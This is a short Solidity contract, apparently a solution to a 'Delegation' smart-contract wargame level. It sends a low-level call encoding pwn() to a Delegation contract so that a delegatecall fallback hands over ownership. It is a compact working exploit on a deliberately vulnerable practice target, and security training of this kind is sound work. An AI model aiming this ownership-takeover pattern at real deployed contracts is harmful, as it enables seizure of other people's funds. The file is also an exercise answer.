// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Delegation.sol";

contract AttackingDelegation {
    address public contractAddress;
    Delegation public delegateContract;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
        delegateContract = Delegation(_contractAddress);
    }

    function hackContract() external {
        // Code me!
        (bool success, ) = address(delegateContract).call(abi.encodeWithSignature("pwn()")); 
    }
}
